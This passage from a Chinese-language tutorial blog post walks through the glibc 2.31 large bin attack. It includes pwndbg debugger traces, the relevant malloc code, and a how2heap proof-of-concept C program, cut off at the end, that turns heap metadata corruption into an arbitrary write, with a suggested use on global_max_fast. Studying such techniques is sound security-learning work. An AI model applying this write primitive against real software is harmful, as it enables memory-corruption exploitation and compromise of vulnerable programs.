(bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径: </p><p>首先布置如下的 heap </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x430</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596c0</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555596e0</span>      <span class="number">0x0</span>                 <span class="number">0x420</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b00</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>0x20 的为  guard chunk ，避免 free 之后 chunk 合并 , 然后我们free p1，此时 chunk p1 会放入 unsortedbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">54</span>   <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line">   <span class="number">55</span></span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line"> ► <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">   <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">64</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe280</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> —▸ <span class="number">0x5555555592a0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b20</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x5555555596d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> —▸ <span class="number">0x5555555596f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe2a0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe2a8</span> —▸ <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe2b0</span> —▸ <span class="number">0x7fffffffe3b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe2b8</span> ◂— <span class="number">0xf7624ffb64d1fe00</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555553f</span>a main+<span class="number">465</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure><p>然后我们再  malloc 一个比 p1 大的 chunk，此时 p1 会被放入到 lagrebin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> ► <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br></pre></td></tr></table></figure><p>然后我们在 free p2  ( p2 大小小于 p1 h和 p3) , 此时 p2 就会被放入到 unsortedbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">65</span>   <span class="built_in">free</span>(p2);</span><br><span class="line"> ► <span class="number">66</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">   <span class="number">67</span>   <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">68</span>   <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555596e0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555555596e0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 p1 的 bk_nextsize 指向 target-0x20 , 此时的 p1 在 largebin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">72</span>   p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">   <span class="number">73</span>   <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span> &lt;------ bk-&gt;nextsize</span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;target</span><br><span class="line">$<span class="number">14</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffe280</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx &amp;target<span class="number">-2</span></span><br><span class="line"><span class="number">0x7fffffffe260</span>:<span class="number">0x00007fffffffe2c0</span><span class="number">0x0000555555555140</span></span><br><span class="line"><span class="number">0x7fffffffe270</span>:<span class="number">0x00007fffffffe3b0</span><span class="number">0x00005555555554a4</span></span><br><span class="line"><span class="number">0x7fffffffe280</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555555592a0</span></span><br><span class="line"><span class="number">0x7fffffffe290</span>:<span class="number">0x00005555555596d0</span><span class="number">0x00005555555596f0</span></span><br><span class="line"><span class="number">0x7fffffffe2a0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559b30</span></span><br></pre></td></tr></table></figure><p>然后我们再 malloc 一个比 p2 大 chunk （此时 p2 在 unsortedbin 里），那么此时，就会将 p2 从 unsortedbin 取出，insert  largebins 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code>   —- &gt; <code> p1-&gt;fd_nextsize = p2-&gt;fd</code></p><p><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</code>   ——&gt; <code>p1-&gt;bk_nextsize = p2-&gt;fd-&gt;bk_next_size</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x5555555596e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x5555555596f0</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559700</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559720</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x7ffff7fb0be0</span> &lt;main_arena+<span class="number">96</span>&gt;:<span class="number">0x0000555555559f60</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fb0bf0</span> &lt;main_arena+<span class="number">112</span>&gt;:<span class="number">0x00005555555596e0</span><span class="number">0x00005555555596e0</span></span><br></pre></td></tr></table></figure><p>这样就成功在 target 目标写入 p2-&gt;fd-&gt;bk_next_size 的值，即 0x00005555555596e0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x5555555596e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>通常而言，这种写大数的行为，我们可以用来修改 <em>global_max_fast</em></p><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : 